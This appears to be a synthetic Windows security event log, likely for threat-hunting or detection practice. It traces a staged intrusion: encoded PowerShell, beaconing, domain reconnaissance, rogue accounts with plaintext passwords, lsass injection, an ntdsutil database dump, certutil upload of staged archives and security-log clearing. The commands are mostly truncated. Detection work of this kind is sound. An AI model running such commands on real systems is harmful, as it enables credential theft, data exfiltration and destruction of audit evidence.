| 2026-08-07 04:35:27 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 48240) - `powershell.exe -NoProfile -EncodedCommand QwBvA...` |
| 2026-08-07 05:09:50 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\rundll32.exe (PID: 55312) - `rundll32.exe C:\Users\arjun.iyer\AppData\Roamin...` |
| 2026-08-07 05:09:52 UTC | arjun.iyer | PC-003 | Beacon | Beacon to 198.51.100.83:443 (49 attempts, 4h) |
| 2026-08-07 06:30:38 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\whoami.exe (PID: 6004) - `whoami /all` |
| 2026-08-07 06:30:49 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 6044) - `systeminfo` |
| 2026-08-07 06:31:30 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\nltest.exe (PID: 6056) - `nltest /dclist:corp.local` |
| 2026-08-07 06:32:12 UTC | priya.menon | PC-007 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-07 06:50:37 UTC | sneha.patel | PC-008 | Logon | Network logon from 203.0.113.47 (LogonID: 0x13238feb) |
| 2026-08-07 06:50:53 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 25664) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-07 06:51:03 UTC | sneha.patel | PC-008 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-07 09:40:20 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\rundll32.exe (PID: 63044) - `rundll32.exe C:\Users\kavya.reddy\AppData\Local...` |
| 2026-08-07 09:40:22 UTC | kavya.reddy | PC-004 | Beacon | Beacon to 198.51.100.164:443 (29 attempts, 21h) |
| 2026-08-07 10:49:50 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: _ldap._tcp.dc._msdcs.corp.local (SRV, NOERROR) |
| 2026-08-07 10:49:50 UTC | arjun.iyer | PC-003 | Dns_Query | DNS query: cdn-metrics-edge.net (A, NOERROR) |
| 2026-08-07 14:11:11 UTC | ananya.sharma | PC-001 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-07 14:11:54 UTC | ananya.sharma | PC-001 | Logon | Network logon from 10.10.10.23 (LogonID: 0x17fc61f9) |
| 2026-08-07 14:12:32 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\cmd.exe (PID: 29748) - `cmd.exe /c net view \FILE-01` |
| 2026-08-07 15:31:17 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 7472) - `schtasks /query /fo LIST /v` |
| 2026-08-07 15:31:42 UTC | rohan.mehta | PC-002 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-07 15:32:09 UTC | rohan.mehta | PC-002 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-07 18:30:47 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\sc.exe (PID: 55464) - `sc.exe query state= all` |
| 2026-08-07 18:31:16 UTC | arjun.iyer | PC-003 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-07 18:31:36 UTC | arjun.iyer | PC-003 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-07 19:10:56 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\net.exe (PID: 63324) - `net user svc-sync-check /add /domain` |
| 2026-08-07 19:11:25 UTC | kavya.reddy | PC-004 | Account_Created | Account created: svc-sync-check |
| 2026-08-07 19:11:43 UTC | kavya.reddy | PC-004 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-07 21:45:13 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xee8adc1) |
| 2026-08-07 21:45:15 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 48396) - `robocopy \\FILE-01\Finance C:\Windows\Temp\fina...` |
| 2026-08-07 21:45:17 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 48428) - `powershell.exe -NoProfile -Command Compress-Arc...` |
| 2026-08-07 23:51:02 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\net.exe (PID: 38668) - `net view /domain:corp.local` |
| 2026-08-07 23:51:09 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 38676) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-07 23:51:22 UTC | rahul.verma | PC-005 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-08 02:50:47 UTC | vikram.nair | PC-006 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-08 02:51:32 UTC | vikram.nair | PC-006 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-08 02:51:40 UTC | vikram.nair | PC-006 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-08 04:25:10 UTC | vikram.nair | PC-006 | Workstation_Lock | Skipped (no eligible interactive session); no evidence emitted |
| 2026-08-08 04:41:39 UTC | vikram.nair | PC-006 | Workstation_Unlock | Workstation Unlocked |
| 2026-08-08 05:31:17 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6084) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-08 05:32:01 UTC | priya.menon | PC-007 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-08 05:32:37 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\cmd.exe (PID: 6092) - `cmd.exe /c sc query EventLog` |
| 2026-08-08 07:00:14 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0xf2e0e7c) |
| 2026-08-08 07:10:27 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 48252) - `robocopy \\FILE-01\Claims C:\Windows\Temp\stage...` |
| 2026-08-08 07:20:00 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 48260) - `powershell.exe -NoProfile -Command Compress-Arc...` |
| 2026-08-08 07:26:03 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\certutil.exe (PID: 48280) - `certutil -encode C:\Windows\Temp\q3-claims.zip ...` |
| 2026-08-08 08:09:50 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\certutil.exe (PID: 55340) - `certutil -urlcache -split -f -post C:\Windows\T...` |
| 2026-08-08 08:09:52 UTC | arjun.iyer | PC-003 | Connection | Connection to 198.51.100.83:443 (UID: (filtered by sensor placement)) |
| 2026-08-08 08:45:01 UTC | priya.menon | FILE-01 | Rdp_Session | RDP session to 10.10.20.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-08 08:45:09 UTC | priya.menon | FILE-01 | Log_Cleared | Security event log cleared to remove traces of the service install |
| 2026-08-08 08:45:09 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 48364) - `wevtutil cl Security` |
| 2026-08-08 09:31:28 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 25692) - `diag-helper.exe --inspect-auth` |
| 2026-08-08 09:31:39 UTC | sneha.patel | PC-008 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-08 09:32:14 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 25696) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-08 13:11:06 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\net.exe (PID: 29768) - `net group "Domain Admins" /domain` |
| 2026-08-08 13:11:34 UTC | ananya.sharma | PC-001 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-08 13:12:04 UTC | ananya.sharma | PC-001 | Logon | Network logon from 10.10.10.23 (LogonID: 0x18a8ea38) |
| 2026-08-08 16:10:47 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\whoami.exe (PID: 7480) - `whoami /all` |
| 2026-08-08 16:11:12 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 7484) - `systeminfo` |
| 2026-08-08 16:11:30 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\nltest.exe (PID: 7492) - `nltest /dclist:corp.local` |
| 2026-08-08 16:12:00 UTC | rohan.mehta | PC-002 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-08 16:19:56 UTC | vikram.nair | PC-006 | Logon | Network logon from 185.220.101.34 (LogonID: 0x1c39d3cd) |
| 2026-08-08 16:25:38 UTC | vikram.nair | PC-006 | Workstation_Lock | Workstation Locked |
| 2026-08-08 16:32:48 UTC | vikram.nair | PC-006 | Workstation_Unlock | Workstation Unlocked |
| 2026-08-08 18:30:42 UTC | arjun.iyer | PC-003 | Logon | Network logon from 203.0.113.47 (LogonID: 0x134846e2) |
| 2026-08-08 18:30:52 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 55568) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-08 18:31:06 UTC | arjun.iyer | PC-003 | Connection | Connection to 91.199.212.132:3389 (UID: (filtered by sensor placement)) |
| 2026-08-08 19:11:27 UTC | kavya.reddy | PC-004 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-08 19:12:05 UTC | kavya.reddy | PC-004 | Logon | Network logon from 10.10.10.23 (LogonID: 0x1977822c) |
| 2026-08-08 19:12:23 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\cmd.exe (PID: 63380) - `cmd.exe /c net view \FILE-01` |
| 2026-08-08 20:51:03 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 38696) - `schtasks /query /fo LIST /v` |
| 2026-08-08 20:51:09 UTC | rahul.verma | PC-005 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-08 20:51:45 UTC | rahul.verma | PC-005 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-08 20:59:52 UTC | rohan.mehta | DC-01 | Process | Process: C:\Windows\System32\ntdsutil.exe (PID: 44888) - `ntdsutil "ac i ntds" "ifm create full C:\Users\...` |
| 2026-08-09 01:30:49 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\sc.exe (PID: 14564) - `sc.exe query state= all` |
| 2026-08-09 01:31:10 UTC | vikram.nair | PC-006 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-09 01:31:36 UTC | vikram.nair | PC-006 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-09 03:45:03 UTC | arjun.iyer | PC-003 | Logon | Network logon from 10.10.10.23 (LogonID: 0x138d9a1d) |
| 2026-08-09 03:45:05 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 55372) - `powershell.exe -NoProfile -Command Get-CimInsta...` |
| 2026-08-09 03:45:06 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.20.30:135 (UID: (filtered by sensor placement)) |
| 2026-08-09 04:34:35 UTC | rohan.mehta | DC-01 | Explicit_Credentials | Explicit credentials: RunAs rohan.mehta on SQL-01 |
| 2026-08-09 05:10:45 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\net.exe (PID: 6136) - `net user svc-sync-check /add /domain` |
| 2026-08-09 05:10:59 UTC | priya.menon | PC-007 | Account_Created | Account created: svc-sync-check |
| 2026-08-09 05:11:27 UTC | priya.menon | PC-007 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-09 09:51:13 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\net.exe (PID: 25748) - `net view /domain:corp.local` |
| 2026-08-09 09:51:41 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 25752) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-09 09:51:54 UTC | sneha.patel | PC-008 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-09 14:10:45 UTC | ananya.sharma | PC-001 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-09 14:11:29 UTC | ananya.sharma | PC-001 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-09 14:11:39 UTC | ananya.sharma | PC-001 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-09 14:30:51 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 7508) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-09 14:31:14 UTC | rohan.mehta | PC-002 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-09 14:31:24 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\cmd.exe (PID: 7512) - `cmd.exe /c sc query EventLog` |
| 2026-08-09 18:30:46 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 55580) - `diag-helper.exe --inspect-auth` |
| 2026-08-09 18:31:22 UTC | arjun.iyer | PC-003 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-09 18:31:50 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 55584) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-09 18:51:21 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\net.exe (PID: 63396) - `net group "Domain Admins" /domain` |
| 2026-08-09 18:51:42 UTC | kavya.reddy | PC-004 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-09 18:52:08 UTC | kavya.reddy | PC-004 | Logon | Network logon from 10.10.10.23 (LogonID: 0x1a290476) |
| 2026-08-10 00:11:30 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\whoami.exe (PID: 38704) - `whoami /all` |
| 2026-08-10 00:11:56 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 38736) - `systeminfo` |
| 2026-08-10 00:12:21 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\nltest.exe (PID: 38764) - `nltest /dclist:corp.local` |
| 2026-08-10 00:12:54 UTC | rahul.verma | PC-005 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-10 04:11:00 UTC | vikram.nair | PC-006 | Logon | Network logon from 203.0.113.47 (LogonID: 0x1d46bd8d) |
| 2026-08-10 04:11:22 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 14616) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-10 04:11:28 UTC | vikram.nair | PC-006 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-10 07:30:52 UTC | priya.menon | PC-007 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-10 07:31:27 UTC | priya.menon | PC-007 | Logon | Network logon from 10.10.10.23 (LogonID: 0xea771a0) |
| 2026-08-10 07:32:06 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\cmd.exe (PID: 6152) - `cmd.exe /c net view \FILE-01` |
| 2026-08-10 07:50:19 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 44864) - `net user svc-report-cache TempReport2026! /add ...` |
| 2026-08-10 07:50:27 UTC | priya.menon | DC-01 | Account_Created | Account created: svc-report-cache |
| 2026-08-10 07:50:28 UTC | priya.menon | DC-01 | Account_Created | Account created: svc-redundancy |
| 2026-08-10 07:50:28 UTC | priya.menon | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 44904) - `net user svc-redundancy Winter2027! /add /domain` |
| 2026-08-10 08:11:30 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 25764) - `schtasks /query /fo LIST /v` |
| 2026-08-10 08:11:38 UTC | sneha.patel | PC-008 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-10 08:12:06 UTC | sneha.patel | PC-008 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-10 13:51:15 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\sc.exe (PID: 29964) - `sc.exe query state= all` |
| 2026-08-10 13:51:25 UTC | ananya.sharma | PC-001 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-10 13:52:07 UTC | ananya.sharma | PC-001 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-10 17:30:53 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\net.exe (PID: 7516) - `net user svc-sync-check /add /domain` |
| 2026-08-10 17:31:15 UTC | rohan.mehta | PC-002 | Account_Created | Account created: svc-sync-check |
| 2026-08-10 17:31:24 UTC | rohan.mehta | PC-002 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-10 18:30:52 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 55600) - `net view /domain:corp.local` |
| 2026-08-10 18:31:02 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 55608) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-10 18:31:40 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-10 18:51:16 UTC | kavya.reddy | PC-004 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-10 18:51:23 UTC | kavya.reddy | PC-004 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-10 18:51:41 UTC | kavya.reddy | PC-004 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-10 22:30:22 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 48448) - `wevtutil cl Security` |
| 2026-08-10 22:30:24 UTC | arjun.iyer | FILE-01 | Log_Cleared | Second-phase log cleanup under claims analyst identity |
| 2026-08-10 23:31:11 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 38776) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-10 23:31:22 UTC | rahul.verma | PC-005 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-10 23:31:44 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\cmd.exe (PID: 38964) - `cmd.exe /c sc query EventLog` |
| 2026-08-11 01:31:02 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 14660) - `diag-helper.exe --inspect-auth` |
| 2026-08-11 01:31:45 UTC | vikram.nair | PC-006 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-11 01:32:27 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 14688) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-11 04:51:19 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\net.exe (PID: 6172) - `net group "Domain Admins" /domain` |
| 2026-08-11 04:51:30 UTC | priya.menon | PC-007 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-11 04:51:57 UTC | priya.menon | PC-007 | Logon | Network logon from 10.10.10.23 (LogonID: 0xf477f05) |
| 2026-08-11 05:59:59 UTC | arjun.iyer | FILE-01 | Logon | Network logon from 10.10.10.23 (LogonID: 0x11427c71) |
| 2026-08-11 06:07:18 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 48372) - `cmd.exe /c dir \FILE-01\Finance /s /b` |
| 2026-08-11 06:11:23 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\whoami.exe (PID: 25768) - `whoami /all` |
| 2026-08-11 06:11:50 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 25772) - `systeminfo` |
| 2026-08-11 06:12:29 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\nltest.exe (PID: 25796) - `nltest /dclist:corp.local` |
| 2026-08-11 06:12:31 UTC | arjun.iyer | FILE-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 48376) - `powershell.exe -NoProfile -Command Compress-Arc...` |
| 2026-08-11 06:13:00 UTC | sneha.patel | PC-008 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-11 12:50:37 UTC | ananya.sharma | PC-001 | Logon | Network logon from 203.0.113.47 (LogonID: 0x1ac231d6) |
| 2026-08-11 12:51:14 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 30008) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-11 12:51:52 UTC | ananya.sharma | PC-001 | Connection | Connection to 10.10.10.20:3389 (UID: (filtered by sensor placement)) |
| 2026-08-11 15:51:01 UTC | rohan.mehta | PC-002 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-11 15:51:29 UTC | rohan.mehta | PC-002 | Logon | Network logon from 10.10.10.23 (LogonID: 0x10c0540d) |
| 2026-08-11 15:51:49 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\cmd.exe (PID: 7568) - `cmd.exe /c net view \FILE-01` |
| 2026-08-11 18:31:00 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 55624) - `schtasks /query /fo LIST /v` |
| 2026-08-11 18:31:23 UTC | arjun.iyer | PC-003 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-11 18:31:46 UTC | arjun.iyer | PC-003 | Connection | Connection to 93.184.220.29:443 (UID: (filtered by sensor placement)) |
| 2026-08-11 18:50:58 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\sc.exe (PID: 63428) - `sc.exe query state= all` |
| 2026-08-11 18:51:35 UTC | kavya.reddy | PC-004 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-11 18:52:11 UTC | kavya.reddy | PC-004 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-11 20:40:10 UTC | rohan.mehta | PC-002 | Logon | Network logon from 10.10.10.23 (LogonID: 0x10e46ebd) |
| 2026-08-11 20:40:11 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\mstsc.exe (PID: 7288) - `mstsc.exe /v:DC-01` |
| 2026-08-11 23:10:50 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\net.exe (PID: 38968) - `net user svc-sync-check /add /domain` |
| 2026-08-11 23:11:22 UTC | rahul.verma | PC-005 | Account_Created | Account created: svc-sync-check |
| 2026-08-11 23:11:51 UTC | rahul.verma | PC-005 | Group_Member_Added | Added svc-sync-check to group Remote Desktop Users |
| 2026-08-12 02:51:19 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\net.exe (PID: 14712) - `net view /domain:corp.local` |
| 2026-08-12 02:51:39 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 14732) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache ...` |
| 2026-08-12 02:52:14 UTC | vikram.nair | PC-006 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-12 06:51:23 UTC | priya.menon | PC-007 | Dns_Query | DNS query: sync-check.corp-update.example (TXT, NOERROR) |
| 2026-08-12 06:51:58 UTC | priya.menon | PC-007 | Dns_Query | DNS query: k7.sync-check.corp-update.example (A, NOERROR) |
| 2026-08-12 06:52:18 UTC | priya.menon | PC-007 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-12 10:10:55 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 25800) - `wevtutil qe Security /c:5 /rd:true /f:text` |
| 2026-08-12 10:11:28 UTC | sneha.patel | PC-008 | Log_Cleared | Synthetic defense evasion attack activity with multiple correlated indicators in one 10-minute window |
| 2026-08-12 10:11:41 UTC | sneha.patel | PC-008 | Process | Process: C:\Windows\System32\cmd.exe (PID: 25808) - `cmd.exe /c sc query EventLog` |
| 2026-08-12 12:50:24 UTC | rohan.mehta | PC-002 | Logon | Network logon from 10.10.10.23 (LogonID: 0x115db4df) |
| 2026-08-12 12:50:26 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\mstsc.exe (PID: 7352) - `mstsc.exe /v:DC-01` |
| 2026-08-12 13:31:12 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 30024) - `diag-helper.exe --inspect-auth` |
| 2026-08-12 13:31:43 UTC | ananya.sharma | PC-001 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-12 13:32:14 UTC | ananya.sharma | PC-001 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 30028) - `powershell.exe -NoProfile -Command "Get-Service"` |
| 2026-08-12 16:10:33 UTC | rohan.mehta | PC-002 | Process | Process: C:\Windows\System32\net.exe (PID: 7576) - `net group "Domain Admins" /domain` |
| 2026-08-12 16:11:10 UTC | rohan.mehta | PC-002 | Group_Member_Added | Added rahul.verma to group Remote Desktop Users |
| 2026-08-12 16:11:35 UTC | rohan.mehta | PC-002 | Logon | Network logon from 10.10.10.23 (LogonID: 0x1176dbcd) |
| 2026-08-12 18:30:51 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\whoami.exe (PID: 55660) - `whoami /all` |
| 2026-08-12 18:31:02 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 55664) - `systeminfo` |
| 2026-08-12 18:31:20 UTC | arjun.iyer | PC-003 | Process | Process: C:\Windows\System32\nltest.exe (PID: 55672) - `nltest /dclist:corp.local` |
| 2026-08-12 18:31:39 UTC | arjun.iyer | PC-003 | Connection | Connection to 10.10.10.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-12 18:51:24 UTC | kavya.reddy | PC-004 | Logon | Network logon from 203.0.113.47 (LogonID: 0x1c44ea98) |
| 2026-08-12 18:51:53 UTC | kavya.reddy | PC-004 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 63468) - `powershell.exe -NoProfile -Command "Get-Process"` |
| 2026-08-12 18:52:05 UTC | kavya.reddy | PC-004 | Connection | Connection to 91.199.212.132:3389 (UID: (filtered by sensor placement)) |
| 2026-08-12 21:50:58 UTC | rahul.verma | PC-005 | Explicit_Credentials | Explicit credentials: RunAs priya.menon on FILE-01 |
| 2026-08-12 21:51:25 UTC | rahul.verma | PC-005 | Logon | Network logon from 10.10.10.23 (LogonID: 0x1231f057) |
| 2026-08-12 21:51:43 UTC | rahul.verma | PC-005 | Process | Process: C:\Windows\System32\cmd.exe (PID: 39004) - `cmd.exe /c net view \FILE-01` |
| 2026-08-12 22:14:47 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 48456) - `sc stop AuditSyncSvc` |
| 2026-08-12 22:14:49 UTC | priya.menon | FILE-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 48520) - `cmd.exe /c del /f C:\Windows\Temp\auditsync.exe /a` |
| 2026-08-13 02:50:40 UTC | vikram.nair | PC-006 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 14736) - `schtasks /query /fo LIST /v` |
| 2026-08-13 02:51:01 UTC | vikram.nair | PC-006 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\UpdateCache\TelemetrySync |
| 2026-08-13 02:51:07 UTC | vikram.nair | PC-006 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
| 2026-08-13 04:31:23 UTC | priya.menon | PC-007 | Process | Process: C:\Windows\System32\sc.exe (PID: 6336) - `sc.exe query state= all` |
| 2026-08-13 04:32:01 UTC | priya.menon | PC-007 | Service_Installed | Service installed: UpdateTelemetrySvc (C:\ProgramData\UpdateCache\telemetry.exe) |
| 2026-08-13 04:32:43 UTC | priya.menon | PC-007 | Connection | Connection to 198.51.100.44:443 (UID: (filtered by sensor placement)) |
